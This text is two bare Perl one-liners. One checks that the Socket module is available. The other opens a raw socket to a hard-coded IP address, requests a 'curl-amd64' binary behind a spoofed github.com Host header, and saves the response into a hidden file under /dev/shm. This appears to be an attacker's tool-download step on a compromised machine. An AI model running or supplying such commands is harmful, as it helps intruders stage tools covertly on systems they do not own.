perl -e 'use Socket; print "Socket OK"'

perl -MSocket -e 'socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in(80,inet_aton("176.160.153.17:6001")));print S "GET /curl-amd64 HTTP/1.0\r\nHost: github.com\r\n\r\n";open(O,">/dev/shm/.x");while(<S>){$h=1 if $_ =~ /^\r?\n$/; print O $_ if $h;}close(O);'
